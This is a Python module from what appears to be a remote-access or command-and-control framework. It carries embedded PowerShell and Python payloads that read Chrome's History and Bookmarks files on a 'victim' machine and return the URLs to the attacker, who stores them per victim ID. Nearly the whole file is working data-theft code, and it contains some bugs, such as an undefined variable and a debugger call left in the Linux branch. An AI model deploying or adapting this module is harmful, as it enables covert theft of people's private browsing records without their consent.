import sys
import os
import pdb
import pathlib
import time
sys.path.append(os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../lib'))

from module import Module


class Browser_History(Module):
	description = 'This module retrieves the browser history and bookmarks from chrome browser of the victim.'
	
	@classmethod
	def module_options(cls):
		h = {
			'path' : {'desc' : 'Directory on the attacker machine where the files are downloaded. Default is shared/victim_data/<victim_id>', 'required' : False} 
		}
		return h

	def __init__(self,name,utility,language,options):
		## We are loading the script in the script variable here
		super(Browser_History, self).__init__(name,self.description,utility,language,getattr(self,f"script_{language}")(options))    

	## This class is called when victim returns the output for the task of this module. What is to be done with the output is defined here
	def handle_task_output(self,data,options,victim_id,task_id):
		## Comes as a bytes object, so changing to string
		output = data.decode('utf-8')


		## Default Dumping path
		dump_path = os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../shared/victim_data',victim_id)

		if not os.path.exists(dump_path):
			os.makedirs(dump_path)

		filename = f"browserhistory_{time.strftime('%Y%m%d-%H%M%S')}_{task_id}.txt"
		file_path = os.path.join(dump_path,filename)

		if 'path' in  options:
			if not os.path.exists(options['path']):
				print(f"Provided save path does not exists - {options['path']}. Saving to default directory {ss_path}")
			else:
				file_path = os.path.join(options['path'],filename)

		f = open(file_path,'w+')
		print(output,file=f)

		## In DB or in logs only indicate where the output is stored
		output = file_path

		return output
    

	def script_powershell(self,options):
		return """function Get-ChromeHistory {
	    $Path = "$Env:systemdrive\\Users\\$UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
	    if (-not (Test-Path -Path $Path)) {
	        Write-Verbose "[!] Could not find Chrome History for username: $UserName"
	    }
	    $Regex = '(htt(p|s))://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&=]*)*?'
	    $Value = Get-Content -Path "$Env:systemdrive\\Users\\$UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"|Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
	    $Value | ForEach-Object {
	        $Key = $_
	        if ($Key -match $Search){
	            New-Object -TypeName PSObject -Property @{
	                User = $UserName
	                Browser = 'Chrome'
	                DataType = 'History'
	                Data = $_
	            }
	        }
	    }        
	}


	function ConvertFrom-Json20([object] $item){
	    #http://stackoverflow.com/a/29689642
	    Add-Type -AssemblyName System.Web.Extensions
	    $ps_js = New-Object System.Web.Script.Serialization.JavaScriptSerializer
	    return ,$ps_js.DeserializeObject($item)
	    
	}

	function Get-ChromeBookmarks {
	$Path = "$Env:systemdrive\\Users\\$UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks"
	if (-not (Test-Path -Path $Path)) {
	    Write-Verbose "[!] Could not find FireFox Bookmarks for username: $UserName"
	}   else {
	        $Json = Get-Content $Path
	        $Output = ConvertFrom-Json20($Json)
	        $Jsonobject = $Output.roots.bookmark_bar.children
	        $Jsonobject.url |Sort -Unique | ForEach-Object {
	            if ($_ -match $Search) {
	                New-Object -TypeName PSObject -Property @{
	                    User = $UserName
	                    Browser = 'Chrome'
	                    DataType = 'Bookmark'
	                    Data = $_
	                }
	            }
	        }
	    }
	}

	$UserName = "$ENV:USERNAME"
	$history = Get-ChromeHistory

	# Get-ChromeBookmarks

	$bookmarks = Get-ChromeBookmarks


	return $history + $bookmarks"""
	def script_python(self,options):
		return """def execute_command():
		import platform
		import os
		import pdb
		import re
		import json
		if platform.system() == 'Windows':
			history_file = os.path.join(os.environ['systemdrive'], "\\\\Users", os.environ['username'] , "AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\History")
			bookmark_file = os.path.join(os.environ['systemdrive'], "\\\\Users", os.environ['username'] , "AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Bookmarks")

			history = []
			if os.path.isfile(history_file):
				f = open(history_file, "r", errors='ignore')
				f = f.read()
				
				for url in  re.findall(r'(htt(p|ps)://([\\w-]+\\.)+\\w*)',f):
					history.append(url[0])

				history = (list(set(history)))
				formatted_output = "Browser User DataType Data \\n------- ---- -------- ---- \\n"
				for string in history:
					formatted_history = "Chrome  "+os.environ['username']+" History "+string+" \\n"
					formatted_output+= formatted_history
			else:
				return("History File not present")
				
			if os.path.isfile(bookmark_file):
				f = open(bookmark_file, "r", errors='ignore')
				f = f.read()
				bookmark = []
				for url in re.findall('"url": "(.+)"',f):
					bookmark.append(url)

				bookmark = (list(set(bookmark)))

				formatted_output += "Browser User DataType Data \\n------- ---- -------- ---- \\n"
				for string in history:
					formatted_bookmark = "Chrome  "+os.environ['username']+" Bookmark "+string+" \\n"
					formatted_output+= formatted_bookmark
			else:
				return("Bookmark File not present")

			return formatted_output
			

		elif platform.system() == 'Linux':
			pdb.set_trace()"""